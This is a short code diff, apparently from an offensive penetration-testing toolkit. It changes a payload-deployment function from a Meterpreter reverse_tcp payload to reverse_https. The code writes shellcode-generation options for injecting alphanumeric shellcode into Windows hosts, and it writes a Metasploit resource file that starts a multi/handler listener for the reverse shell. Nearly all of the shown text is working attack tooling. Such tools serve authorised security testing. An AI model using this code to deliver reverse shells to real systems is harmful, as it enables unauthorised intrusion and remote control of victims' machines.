@@ -208,7 +208,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
             "Prepping the payload for delivery and injecting alphanumeric shellcode...")
         filewrite = open(setdir + "/payload_options.shellcode", "w")
         # format needed for shellcode generation
-        filewrite.write("windows/meterpreter/reverse_tcp" + " " + port + ",")
+        filewrite.write("windows/meterpreter/reverse_https" + " " + port + ",")
         filewrite.close()
         try:
             module_reload(src.payloads.powershell.prep)
@@ -233,7 +233,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
             powershell_dir = setdir + "/reports/powershell/x86_powershell_injection.txt"
             filewrite = open(setdir + "/reports/powershell/powershell.rc", "w")
             filewrite.write(
-                "use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
+                "use multi/handler\nset payload windows/meterpreter/reverse_https\nset lport %s\nset LHOST 0.0.0.0\nexploit -j" % (port))
             filewrite.close()
 
         # grab the metasploit path from config or smart detection
